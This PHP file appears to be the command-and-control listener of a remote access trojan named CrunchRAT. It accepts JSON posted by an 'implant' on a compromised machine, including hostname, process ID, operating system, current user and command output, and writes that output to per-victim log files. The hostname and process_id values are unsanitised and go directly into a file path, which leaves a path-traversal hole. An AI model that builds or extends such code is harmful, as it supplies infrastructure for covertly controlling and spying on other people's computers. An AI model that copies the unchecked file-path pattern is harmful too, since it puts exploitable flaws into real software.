<?php
    # JSON decodes implant POST data
    $post_data = json_decode(file_get_contents("php://input"), true);

    # TO DO: Add in checks for POST data, reject all requests that don't have the proper POST parameters

    $hostname = $post_data["hostname"];
    $process_id = $post_data["process_id"];
    $os = $post_data["os"];
    $current_user = $post_data["current_user"];

    $output = $post_data["output"];
    $error = $post_data["error"];

    # TO DO: Check if command output or error

    # If output
    if (isset($output) && !empty($output)) {
        file_put_contents("/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log", "\nReceived output: \n" . $output, FILE_APPEND);
    }
    # Else error
    else {
        file_put_contents("/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log", "\nReceived error: \n" . $error, FILE_APPEND);
    }
?>